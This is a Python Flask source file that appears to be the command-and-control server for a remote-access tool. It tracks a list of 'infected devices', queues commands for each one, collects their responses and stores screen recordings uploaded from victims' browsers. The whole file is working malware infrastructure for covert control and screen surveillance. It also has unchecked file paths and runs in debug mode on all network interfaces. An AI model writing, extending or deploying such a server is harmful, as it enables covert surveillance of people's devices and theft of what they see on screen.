import os
from flask_cors import CORS
from flask import Flask, jsonify, send_file, request

app = Flask(__name__)
CORS(app, supports_credentials=True)

SCREEN_RECORDINGS_DIR = "screen_recordings"
INFECTED_DEVICES = []
messages = {}
responses = {}

@app.route("/")
def home():
  return send_file("templates/index.html")

@app.route("/success")
def success():
  return send_file("templates/success/index.html")

@app.route("/fatal")
def fatal():
  return send_file("templates/fatal/index.html")

@app.route("/commands", methods=["POST", "GET"])
def commands():
  if request.method == 'POST':
    message = request.get_json(force=True, silent=True) or {}
    req = message.get('request', '')

    # Server Payload Handler
    if 'ping' in req:
      return jsonify({'status': 'pong'}), 200
    if 'new-device' in message:
      DEVICE_NAME = message['new-device'].upper()
      if DEVICE_NAME not in INFECTED_DEVICES:
        INFECTED_DEVICES.append(DEVICE_NAME)
      return jsonify({'status': 'success'}), 200
    elif 'delete-all-devices' in req:
      INFECTED_DEVICES.clear()
      return jsonify({'status': 'success'}), 200
    elif 'get-all-devices' in req:
      return jsonify({'status': 'success', 'devices': INFECTED_DEVICES}), 200
    elif 'remove-device' in req:
      DEVICE = message['device'].upper()
      if DEVICE in INFECTED_DEVICES:
        INFECTED_DEVICES.remove(DEVICE)
      return jsonify({'status': 'success'}), 200

    # WebClient Payload Handler
    DEVICE = request.args.get('device', '').upper()
    if DEVICE in INFECTED_DEVICES:
      if DEVICE not in messages: messages[DEVICE] = []
      messages[DEVICE].append(message)
      return jsonify({'status': 'success'}), 200

    return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404
  elif request.method == 'GET':
    DEVICE = request.args.get('device', '').upper()
    if DEVICE in INFECTED_DEVICES:
      out = messages.get(DEVICE, [])
      messages.pop(DEVICE, None)
      return jsonify(out), 200
    
    return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404

@app.route("/responses", methods=["POST", "GET"])
def responses_path():
  DEVICE = request.args.get('device', '').upper()
  if request.method == 'POST':
    # WebClient Video Submission Handler
    if request.files and request.form:
      FILENAME = request.form.get('filename')
      video = request.files['video']

      if DEVICE in FILENAME and DEVICE in INFECTED_DEVICES:
        video.save(os.path.join(SCREEN_RECORDINGS_DIR, FILENAME))
        return jsonify({'status': 'success'}), 200

      return jsonify({'status': 'fatal', 'message': 'video sent fron non-registered device.'}), 401
    else:
      # WebClient Standard Response Handler
      data = request.get_json(force=True, silent=True) or {}
      
      if DEVICE in INFECTED_DEVICES:
        if DEVICE not in responses:
          responses[DEVICE] = []
        responses[DEVICE].append(data)
        return jsonify({'status': 'success'}), 200
      
      return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404
  elif request.method == 'GET':
    if DEVICE in INFECTED_DEVICES:
      out = responses.get(DEVICE, [])
      responses.pop(DEVICE, None)
      return jsonify(out), 200

    return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404

@app.route("/resources/<path:filename>")
def serve_resource(filename):
  return send_file(f"templates/{filename}")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=8003, debug=True)